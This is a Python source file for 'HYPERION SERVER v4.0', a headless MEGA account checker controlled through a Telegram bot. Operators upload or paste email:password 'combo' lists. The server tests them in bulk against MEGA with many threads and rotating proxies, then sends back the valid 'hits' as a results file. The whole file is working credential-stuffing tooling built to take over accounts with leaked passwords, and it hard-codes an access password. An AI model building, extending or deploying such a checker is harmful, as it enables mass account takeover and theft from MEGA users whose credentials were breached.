#!/usr/bin/env python3
"""
HYPERION SERVER v4.0 - Headless MEGA Checker with Telegram Bot Integration
Designed for VPS/Server deployment (Ubuntu, CentOS, Digital Ocean, etc.)
No GUI dependencies - runs completely headless with Telegram interface

Features:
- Headless operation (no GUI)
- Telegram Bot integration for combo input and results delivery
- Auto-deployment on any VPS/server
- Lightweight with minimal dependencies
- Auto-restart and monitoring capabilities
"""

import asyncio
import logging
import os
import sys
import json
import time
import threading
import multiprocessing
import gc
import platform
import zipfile
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
import signal

# Telegram Bot imports
try:
    from telegram import Update, Document
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram libraries not found. Install with: pip install python-telegram-bot")

# Core MEGA checking imports
from mega_auth import MegaAuthenticator
from checker_engine import CheckerEngine
from proxy_rotator import ProxyManager

# Configure logging for server environment
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('hyperion_server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class HyperionServer:
    """Headless HYPERION server with Telegram integration"""
    
    def __init__(self, telegram_token: str = None):
        self.telegram_token = telegram_token
        self.is_running = False
        self.current_job = None
        self.jobs_queue = []
        self.stats = {
            'total': 0, 'checked': 0, 'hits': 0, 'fails': 0, 'errors': 0,
            'start_time': None, 'rate': 0
        }
        
        # Performance optimization (lightweight)
        self.cpu_cores = multiprocessing.cpu_count()
        self.optimal_threads = min(self.cpu_cores * 2, 50)
        
        # Initialize checker components
        self.authenticator = MegaAuthenticator()
        self.checker_engine = None
        self.proxy_manager = ProxyManager()
        
        # Results storage
        self.hits = []
        self.results_dir = Path("server_results")
        self.results_dir.mkdir(exist_ok=True)
        
        # Telegram application
        self.telegram_app = None
        self.authorized_users = set()  # Add authorized user IDs
        
        logger.info("🚀 HYPERION Server initialized")
        logger.info(f"   💻 CPU Cores: {self.cpu_cores}")
        logger.info(f"   ⚡ Optimal Threads: {self.optimal_threads}")
        logger.info(f"   🤖 Telegram: {'Available' if TELEGRAM_AVAILABLE and telegram_token else 'Disabled'}")
    
    async def setup_telegram_bot(self):
        """Setup Telegram bot handlers"""
        if not TELEGRAM_AVAILABLE or not self.telegram_token:
            logger.warning("Telegram bot not available - token missing or library not installed")
            return False
        
        try:
            self.telegram_app = Application.builder().token(self.telegram_token).build()
            
            # Command handlers
            self.telegram_app.add_handler(CommandHandler("start", self.cmd_start))
            self.telegram_app.add_handler(CommandHandler("help", self.cmd_help))
            self.telegram_app.add_handler(CommandHandler("status", self.cmd_status))
            self.telegram_app.add_handler(CommandHandler("stop", self.cmd_stop))
            self.telegram_app.add_handler(CommandHandler("results", self.cmd_results))
            self.telegram_app.add_handler(CommandHandler("auth", self.cmd_auth))
            
            # File handler for combo uploads
            self.telegram_app.add_handler(MessageHandler(filters.Document.ALL, self.handle_combo_file))
            
            # Text handler for combo paste
            self.telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_combo_text))
            
            logger.info("✅ Telegram bot setup complete")
            return True
            
        except Exception as e:
            logger.error(f"❌ Telegram bot setup failed: {e}")
            return False
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler"""
        user_id = update.effective_user.id
        welcome_msg = f"""
🚀 **HYPERION Server v4.0** - Headless MEGA Checker

**Commands:**
/help - Show this help message
/status - Check server status
/auth <password> - Authenticate (required)
/stop - Stop current checking job
/results - Get latest results

**Usage:**
1. Send /auth <password> to authenticate
2. Send combo file (.txt) or paste combo list
3. Server will automatically start checking
4. Results will be sent back automatically

**Status:** Ready for combos!
        """
        await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Help command handler"""
        help_msg = """
🔧 **HYPERION Server Commands**

**Authentication:**
`/auth <password>` - Authenticate to use the server

**Checking:**
• Send .txt file with combo list (email:password format)
• Or paste combo list directly in chat
• Server automatically starts checking

**Monitoring:**
`/status` - Current server status and progress
`/stop` - Stop current checking job
`/results` - Download latest results

**File Formats Supported:**
• .txt files with email:password format
• Direct text paste in chat
• Automatic duplicate removal
• Progress updates every 100 checks

**Server Features:**
• Headless operation (no GUI needed)
• Multi-core processing
• Automatic proxy rotation
• Real-time progress updates
• Automatic results delivery
        """
        await update.message.reply_text(help_msg, parse_mode='Markdown')
    
    async def cmd_auth(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Authentication command handler"""
        user_id = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /auth <password>")
            return
        
        password = context.args[0]
        # Simple password check (you can enhance this)
        if password == "hyperion2025":  # Change this password!
            self.authorized_users.add(user_id)
            await update.message.reply_text("✅ Authentication successful! You can now send combo files.")
            logger.info(f"User {user_id} authenticated successfully")
        else:
            await update.message.reply_text("❌ Invalid password. Access denied.")
            logger.warning(f"Failed authentication attempt from user {user_id}")
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user is authorized"""
        return user_id in self.authorized_users
    
    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Status command handler"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Please authenticate first with /auth <password>")
            return
        
        if self.is_running and self.current_job:
            elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
            rate = (self.stats['checked'] / elapsed * 60) if elapsed > 0 else 0
            progress = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            
            status_msg = f"""
📊 **HYPERION Server Status**

**Current Job:** Running
**Progress:** {self.stats['checked']:,} / {self.stats['total']:,} ({progress:.1f}%)
**Hits Found:** {self.stats['hits']:,}
**Failed:** {self.stats['fails']:,}
**Rate:** {rate:.0f} checks/min
**Elapsed:** {elapsed:.0f} seconds
**Threads:** {self.optimal_threads}
            """
        else:
            status_msg = """
📊 **HYPERION Server Status**

**Current Job:** Idle
**Status:** Ready for combo files
**Queue:** Empty

Send a combo file to start checking!
            """
        
        await update.message.reply_text(status_msg, parse_mode='Markdown')
    
    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop command handler"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Please authenticate first with /auth <password>")
            return
        
        if self.is_running:
            await self.stop_checking()
            await update.message.reply_text("⏹️ Checking stopped by user request")
        else:
            await update.message.reply_text("ℹ️ No checking job is currently running")
    
    async def cmd_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Results command handler"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Please authenticate first with /auth <password>")
            return
        
        await self.send_latest_results(update.effective_chat.id)
    
    async def handle_combo_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle uploaded combo files"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Please authenticate first with /auth <password>")
            return
        
        if self.is_running:
            await update.message.reply_text("⚠️ Server is busy. Please wait for current job to complete.")
            return
        
        try:
            document = update.message.document
            if not document.file_name.endswith('.txt'):
                await update.message.reply_text("❌ Please send a .txt file with combo list")
                return
            
            # Download file
            file = await context.bot.get_file(document.file_id)
            file_path = f"temp_combo_{update.effective_user.id}.txt"
            await file.download_to_drive(file_path)
            
            # Read and process combos
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combo_lines = [line.strip() for line in f if line.strip() and ':' in line]
            
            os.remove(file_path)  # Clean up temp file
            
            if not combo_lines:
                await update.message.reply_text("❌ No valid combos found in file. Use email:password format.")
                return
            
            await update.message.reply_text(f"📁 File received: {len(combo_lines):,} combos loaded")
            await self.start_checking_job(combo_lines, update.effective_chat.id)
            
        except Exception as e:
            logger.error(f"Error handling combo file: {e}")
            await update.message.reply_text(f"❌ Error processing file: {str(e)}")
    
    async def handle_combo_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle pasted combo text"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Please authenticate first with /auth <password>")
            return
        
        if self.is_running:
            await update.message.reply_text("⚠️ Server is busy. Please wait for current job to complete.")
            return
        
        try:
            text = update.message.text
            combo_lines = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]
            
            if not combo_lines:
                await update.message.reply_text("❌ No valid combos found. Use email:password format.")
                return
            
            if len(combo_lines) < 5:
                await update.message.reply_text("❌ Please send at least 5 combos for checking.")
                return
            
            await update.message.reply_text(f"📝 Text received: {len(combo_lines):,} combos loaded")
            await self.start_checking_job(combo_lines, update.effective_chat.id)
            
        except Exception as e:
            logger.error(f"Error handling combo text: {e}")
            await update.message.reply_text(f"❌ Error processing text: {str(e)}")
    
    async def start_checking_job(self, combo_list: List[str], chat_id: int):
        """Start a new checking job"""
        try:
            # Remove duplicates
            original_count = len(combo_list)
            combo_list = list(set(combo_list))
            duplicates_removed = original_count - len(combo_list)
            
            if duplicates_removed > 0:
                await self.send_telegram_message(chat_id, f"🧹 Removed {duplicates_removed:,} duplicates")
            
            # Initialize job
            self.current_job = {
                'combo_list': combo_list,
                'chat_id': chat_id,
                'start_time': time.time()
            }
            
            self.stats = {
                'total': len(combo_list),
                'checked': 0,
                'hits': 0,
                'fails': 0,
                'errors': 0,
                'start_time': time.time(),
                'rate': 0
            }
            
            self.hits = []
            self.is_running = True
            
            # Send start notification
            start_msg = f"""
🚀 **HYPERION Checking Started**

**Total Combos:** {len(combo_list):,}
**Threads:** {self.optimal_threads}
**Status:** Processing...

Progress updates every 100 checks
            """
            await self.send_telegram_message(chat_id, start_msg)
            
            # Start checking in background thread
            threading.Thread(target=self.run_checking_job, daemon=True).start()
            
        except Exception as e:
            logger.error(f"Error starting checking job: {e}")
            await self.send_telegram_message(chat_id, f"❌ Error starting job: {str(e)}")
    
    def run_checking_job(self):
        """Run the checking job (runs in background thread)"""
        try:
            chat_id = self.current_job['chat_id']
            combo_list = self.current_job['combo_list']
            
            # Initialize CheckerEngine
            self.checker_engine = CheckerEngine(thread_count=self.optimal_threads)
            
            # Setup callbacks
            def progress_callback(checked, total, hits, customs, fails):
                self.stats['checked'] = checked
                self.stats['hits'] = hits
                self.stats['fails'] = fails
                self.stats['errors'] = customs
                
                # Send progress updates every 100 checks
                if checked % 100 == 0 and checked > 0:
                    asyncio.create_task(self.send_progress_update(chat_id))
            
            def status_callback(message, level):
                if level == "hit":
                    # Store hit information
                    self.hits.append(message)
            
            self.checker_engine.set_callbacks(progress_callback, status_callback)
            
            # Configure CheckerEngine
            self.checker_engine.set_configuration(
                keyword="",
                filename="server_hits.txt",
                discord_notifier=None,
                deep_check=False,
                start_position=0
            )
            
            # Prepare accounts for checking
            accounts = []
            for line in combo_list:
                if ':' in line:
                    email, password = line.split(':', 1)
                    accounts.append((email.strip(), password.strip()))
            
            # Start checking
            logger.info(f"Starting to check {len(accounts)} accounts")
            self.checker_engine.start_checking(accounts)
            
            # Wait for completion or stop
            while self.checker_engine.running and self.is_running:
                time.sleep(1)
            
            # Job completed
            asyncio.create_task(self.on_job_complete(chat_id))
            
        except Exception as e:
            logger.error(f"Error in checking job: {e}")
            asyncio.create_task(self.send_telegram_message(
                self.current_job['chat_id'], 
                f"❌ Checking job failed: {str(e)}"
            ))
        finally:
            self.is_running = False
    
    async def send_progress_update(self, chat_id: int):
        """Send progress update to Telegram"""
        try:
            elapsed = time.time() - self.stats['start_time']
            rate = (self.stats['checked'] / elapsed * 60) if elapsed > 0 else 0
            progress = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            
            progress_msg = f"""
📊 **Progress Update**

**Checked:** {self.stats['checked']:,} / {self.stats['total']:,} ({progress:.1f}%)
**Hits:** {self.stats['hits']:,}
**Rate:** {rate:.0f}/min
**Elapsed:** {elapsed:.0f}s
            """
            
            await self.send_telegram_message(chat_id, progress_msg)
            
        except Exception as e:
            logger.error(f"Error sending progress update: {e}")
    
    async def on_job_complete(self, chat_id: int):
        """Handle job completion"""
        try:
            elapsed = time.time() - self.stats['start_time']
            rate = (self.stats['checked'] / elapsed * 60) if elapsed > 0 else 0
            
            completion_msg = f"""
✅ **HYPERION Checking Complete**

**Final Results:**
• Total Checked: {self.stats['checked']:,}
• Hits Found: {self.stats['hits']:,}
• Failed: {self.stats['fails']:,}
• Time Elapsed: {elapsed:.0f} seconds
• Average Rate: {rate:.0f}/min

Results file will be sent shortly...
            """
            
            await self.send_telegram_message(chat_id, completion_msg)
            
            # Send results file
            await self.send_results_file(chat_id)
            
        except Exception as e:
            logger.error(f"Error in job completion: {e}")
        finally:
            self.is_running = False
            self.current_job = None
    
    async def send_results_file(self, chat_id: int):
        """Send results file to Telegram"""
        try:
            if self.stats['hits'] == 0:
                await self.send_telegram_message(chat_id, "📁 No hits found in this checking session.")
                return
            
            # Create results file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            results_file = self.results_dir / f"hyperion_hits_{timestamp}.txt"
            
            with open(results_file, 'w', encoding='utf-8') as f:
                f.write(f"HYPERION Server Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Hits: {self.stats['hits']}\n")
                f.write("=" * 50 + "\n\n")
                
                for hit in self.hits:
                    f.write(f"{hit}\n")
            
            # Send file via Telegram
            with open(results_file, 'rb') as f:
                await self.telegram_app.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=results_file.name,
                    caption=f"🎯 HYPERION Results: {self.stats['hits']} hits found"
                )
            
            logger.info(f"Results file sent: {results_file}")
            
        except Exception as e:
            logger.error(f"Error sending results file: {e}")
            await self.send_telegram_message(chat_id, f"❌ Error sending results: {str(e)}")
    
    async def send_latest_results(self, chat_id: int):
        """Send latest results file"""
        try:
            results_files = list(self.results_dir.glob("hyperion_hits_*.txt"))
            
            if not results_files:
                await self.send_telegram_message(chat_id, "📁 No results files found.")
                return
            
            # Get latest file
            latest_file = max(results_files, key=lambda f: f.stat().st_mtime)
            
            with open(latest_file, 'rb') as f:
                await self.telegram_app.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    filename=latest_file.name,
                    caption=f"📁 Latest results file: {latest_file.name}"
                )
            
        except Exception as e:
            logger.error(f"Error sending latest results: {e}")
            await self.send_telegram_message(chat_id, f"❌ Error: {str(e)}")
    
    async def send_telegram_message(self, chat_id: int, message: str):
        """Send message via Telegram"""
        try:
            if self.telegram_app:
                await self.telegram_app.bot.send_message(
                    chat_id=chat_id,
                    text=message,
                    parse_mode='Markdown'
                )
        except Exception as e:
            logger.error(f"Error sending Telegram message: {e}")
    
    async def stop_checking(self):
        """Stop current checking job"""
        self.is_running = False
        if self.checker_engine:
            self.checker_engine.stop_checking()
        logger.info("Checking job stopped")
    
    async def run_server(self):
        """Run the server"""
        logger.info("🚀 Starting HYPERION Server...")
        
        # Setup Telegram bot
        if await self.setup_telegram_bot():
            logger.info("🤖 Starting Telegram bot...")
            await self.telegram_app.initialize()
            await self.telegram_app.start()
            
            # Keep server running
            try:
                await self.telegram_app.updater.start_polling()
                logger.info("✅ HYPERION Server running! Send /start to the bot to begin.")
                
                # Keep running until interrupted
                while True:
                    await asyncio.sleep(1)
                    
            except KeyboardInterrupt:
                logger.info("Server shutdown requested")
            finally:
                await self.telegram_app.stop()
        else:
            logger.error("❌ Failed to setup Telegram bot")
            return False
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info(f"Received signal {signum}, shutting down...")
        if self.is_running:
            asyncio.create_task(self.stop_checking())
        sys.exit(0)

async def main():
    """Main function"""
    print("""
🚀 HYPERION SERVER v4.0 - Headless MEGA Checker
==============================================

Starting headless server for VPS/Digital Ocean deployment...
    """)
    
    # Get Telegram bot token from environment or config
    telegram_token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not telegram_token:
        print("❌ TELEGRAM_BOT_TOKEN environment variable not set!")
        print("Set it with: export TELEGRAM_BOT_TOKEN='your_bot_token_here'")
        return
    
    if not TELEGRAM_AVAILABLE:
        print("❌ Telegram libraries not installed!")
        print("Install with: pip install python-telegram-bot")
        return
    
    # Create and run server
    server = HyperionServer(telegram_token)
    
    # Setup signal handlers
    signal.signal(signal.SIGINT, server.signal_handler)
    signal.signal(signal.SIGTERM, server.signal_handler)
    
    try:
        await server.run_server()
    except Exception as e:
        logger.error(f"Server error: {e}")
    
if __name__ == "__main__":
    asyncio.run(main())